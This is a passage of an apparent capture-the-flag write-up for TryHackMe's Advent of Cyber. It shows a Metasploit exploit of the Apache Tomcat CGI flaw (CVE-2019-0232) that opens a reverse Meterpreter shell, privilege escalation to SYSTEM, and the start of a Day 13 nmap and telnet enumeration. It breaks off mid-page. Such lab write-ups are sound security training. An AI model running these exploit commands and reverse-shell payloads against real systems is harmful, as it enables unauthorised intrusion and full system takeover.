codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">When running on Windows with enableCmdLineArguments enabled, the CGI Servlet in Apache Tomcat 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39 and 7.0.0 to 7.0.93 is vulnerable to Remote Code Execution due to a bug in the way the JRE passes command line arguments to Windows. The CGI Servlet is disabled by default. The CGI option enableCmdLineArguments is disable by default in Tomcat 9.0.x (and will be disabled by default in all versions in response to this vulnerability). For a detailed explanation of the JRE behaviour, see Markus Wulftange&#x27;s blog (https://codewhitesec.blogspot.com/2016/02/java-and-command-line-injections-in-windows.html) and this archived MSDN blog (https://web.archive.org/web/20161228144344/https://blogs.msdn.microsoft.com/twistylittlepassagesallalike/2011/04/23/everyone-quotes-command-line-arguments-the-wrong-way/).</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="running-the-exploit-using-metasploit">Running the exploit using Metasploit<a href="#running-the-exploit-using-metasploit" class="hash-link" aria-label="Direct link to Running the exploit using Metasploit" title="Direct link to Running the exploit using Metasploit">​</a></h3><p>We start metasploit by running <code>msfconsole</code>.</p><p>First, we search and select the exploit we would like to use:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf6 &gt; search 2019-0232</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Matching Modules</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">================</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   #  Name                                         Disclosure Date  Rank       Check  Description</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   -  ----                                         ---------------  ----       -----  -----------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0  exploit/windows/http/tomcat_cgi_cmdlineargs  2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf6 &gt; use exploit/windows/http/tomcat_cgi_cmdlineargs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) &gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Next, let&#x27;s check out which options we need to set:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) &gt; show options</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Module options (exploit/windows/http/tomcat_cgi_cmdlineargs):</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   Name       Current Setting  Required  Description</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   ----       ---------------  --------  -----------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   RPORT      8080             yes       The target port (TCP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   SSL        false            no        Negotiate SSL/TLS for outgoing connections</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   TARGETURI  /                yes       The URI path to CGI script</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   VHOST                       no        HTTP server virtual host</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Payload options (windows/meterpreter/reverse_tcp):</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   Name      Current Setting  Required  Description</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   ----      ---------------  --------  -----------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   LHOST     172.16.57.163    yes       The listen address (an interface may be specified)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   LPORT     4444             yes       The listen port</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Exploit target:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   Id  Name</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   --  ----</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   0   Apache Tomcat 9.0 or prior for Windows</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We need to set the <code>RHOST</code> to the THM box, the <code>LHOST</code> to my Try Hack Me IP address and the <code>TARGETURI</code> to <code>/cgi-bin/elfwhacker.bat</code>.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) &gt; set RHOSTS 10.10.143.182</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">RHOSTS =&gt; 10.10.143.182</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) &gt; set LHOSTS 10.6.23.34</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">LHOST =&gt; 10.6.23.34</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) &gt; set TARGETURI /cgi-bin/elfwhacker.bat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">TARGETURI =&gt; /cgi-bin/elfwhacker.bat</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then, I can run the exploit to get a shell!</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) &gt; run</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Started reverse TCP handler on 10.6.23.34:4444 </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Executing automatic check (disable AutoCheck to override)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] The target is vulnerable.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Command Stager progress -   6.95% done (6999/100668 bytes)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Command Stager progress -  13.91% done (13998/100668 bytes)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Command Stager progress -  20.86% done (20997/100668 bytes)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Command Stager progress -  27.81% done (27996/100668 bytes)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Command Stager progress -  34.76% done (34995/100668 bytes)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Command Stager progress -  41.72% done (41994/100668 bytes)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Command Stager progress -  48.67% done (48993/100668 bytes)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Command Stager progress -  55.62% done (55992/100668 bytes)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Command Stager progress -  62.57% done (62991/100668 bytes)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Command Stager progress -  69.53% done (69990/100668 bytes)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Command Stager progress -  76.48% done (76989/100668 bytes)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Command Stager progress -  83.43% done (83988/100668 bytes)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Command Stager progress -  90.38% done (90987/100668 bytes)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Command Stager progress -  97.34% done (97986/100668 bytes)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Command Stager progress - 100.02% done (100692/100668 bytes)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Sending stage (175174 bytes) to 10.10.143.182</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Meterpreter session 1 opened (10.6.23.34:4444 -&gt; 10.10.143.182:49907) at 2020-12-12 15:39:53 -0500</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">meterpreter &gt; shell</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Process 3992 created.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Channel 1 created.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Microsoft Windows [Version 10.0.17763.737]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">(c) 2018 Microsoft Corporation. All rights reserved.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi-bin&gt;whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">tbfc-web-01\elfmcskidy</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="getting-the-flag-4">Getting the flag<a href="#getting-the-flag-4" class="hash-link" aria-label="Direct link to Getting the flag" title="Direct link to Getting the flag">​</a></h3><p>Now that we have a Windows Command Prompt, the real challenge has begun: actually using it LOL (ok, you see, i&#x27;m much more comfortable in a UNIX terminal...)</p><p>We use <code>dir</code> and <code>type</code> instead of <code>ls</code> and <code>cat</code> respectively.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi-bin&gt;dir</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dir</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> Volume in drive C has no label.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> Volume Serial Number is 4277-4242</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> Directory of C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi-bin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">12/12/2020  20:39    &lt;DIR&gt;          .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">12/12/2020  20:39    &lt;DIR&gt;          ..</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">19/11/2020  21:39               825 elfwhacker.bat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">19/11/2020  22:06                27 flag1.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">12/12/2020  20:39            73,802 vzlXv.exe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">               3 File(s)         74,654 bytes</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">               2 Dir(s)  13,497,925,632 bytes free</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi-bin&gt;type flag1.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">type flag1.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">thm{whacking_all_the_elves}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>And now we have the flag!</p><p>Flag: <code>thm{whacking_all_the_elves}</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation-1">Privilege Escalation<a href="#privilege-escalation-1" class="hash-link" aria-label="Direct link to Privilege Escalation" title="Direct link to Privilege Escalation">​</a></h3><p>There is an extra challenge! Privilege escalation was actually made very very simple with Metasploit.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">meterpreter &gt; getuid</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Server username: TBFC-WEB-01\elfmcskidy</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">meterpreter &gt; getsystem</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">meterpreter &gt; getuid</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Server username: NT AUTHORITY\SYSTEM</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>(note: since this is a windows box, <code>NT AUTHORITY\SYSTEM == root</code>)</p><p>Although, I assume there is another flag2.txt or something on this box, unfortunately, I was not able to find it...</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="day-13-coal-for-christmas">Day 13: Coal for Christmas<a href="#day-13-coal-for-christmas" class="hash-link" aria-label="Direct link to Day 13: Coal for Christmas" title="Direct link to Day 13: Coal for Christmas">​</a></h2><p><em>Category: Special</em><br>
<em>Tags: DirtyCow, Privilege Escalation</em><br>
<em>Special Contributer: John Hammond</em></p><blockquote><p>Kris Kringle checked his Naughty or Nice List, and he saw that more than a few sysadmins were on the naughty list! He went down the chimney and found old, outdated software, deprecated technologies and a whole environment that was so dirty! Take a look at this server and help prove that this house really deserves coal for Christmas!</p></blockquote><p>IP: <code>10.10.49.209</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="basic-enumeration-6">Basic enumeration<a href="#basic-enumeration-6" class="hash-link" aria-label="Direct link to Basic enumeration" title="Direct link to Basic enumeration">​</a></h3><p>We start off with a basic Nmap scan</p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">nmap -sC -sV -oN nmap.log 10.10.49.209</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We get the following output:</p><div class="language-log codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-log codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Nmap 7.80 scan initiated Sun Dec 13 13:35:26 2020 as: nmap -sC -sV -oN nmap.log 10.10.49.209</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap scan report for 10.10.49.209</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host is up (0.11s latency).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Not shown: 997 closed ports</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT    STATE SERVICE VERSION</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">22/tcp  open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssh-hostkey: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">23/tcp  open  telnet  Linux telnetd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">111/tcp open  rpcbind 2-4 (RPC #100000)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| rpcinfo: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   program version    port/proto  service</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   100000  2,3,4        111/tcp   rpcbind</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   100000  2,3,4        111/udp   rpcbind</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   100000  3,4          111/tcp6  rpcbind</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   100000  3,4          111/udp6  rpcbind</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   100024  1          43633/udp6  status</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   100024  1          50615/tcp6  status</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   100024  1          52966/udp   status</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  100024  1          58940/tcp   status</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Nmap done at Sun Dec 13 13:35:53 2020 -- 1 IP address (1 host up) scanned in 27.48 seconds</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="what-old-deprecated-protocol-and-service-is-running">What old, deprecated protocol and service is running?<a href="#what-old-deprecated-protocol-and-service-is-running" class="hash-link" aria-label="Direct link to What old, deprecated protocol and service is running?" title="Direct link to What old, deprecated protocol and service is running?">​</a></h4><p>We can see <code>telnet</code> running on port 23. Telnet is the predecessor to SSH. However, unlike SSH, it is unencrypted which means that <code>stdin</code> and <code>stdout</code> are sent in clear text.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="getting-a-shell-1">Getting a shell<a href="#getting-a-shell-1" class="hash-link" aria-label="Direct link to Getting a shell" title="Direct link to Getting a shell">​</a></h3><p>We can use telnet to get a shell</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">telnet 10.10.49.209 23</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Once we attempt to connect, it gives us a username and password!</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Trying 10.10.49.209...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Connected to 10.10.49.209.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Escape character is &#x27;^]&#x27;.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HI SANTA!!! </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">We knew you were coming and we wanted to make</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">it easy to drop off presents, so we created</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">an account for you to use.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Username: santa</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Password: clauschristmas</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">We left you cookies and milk!</span><br></span></code></pre><div 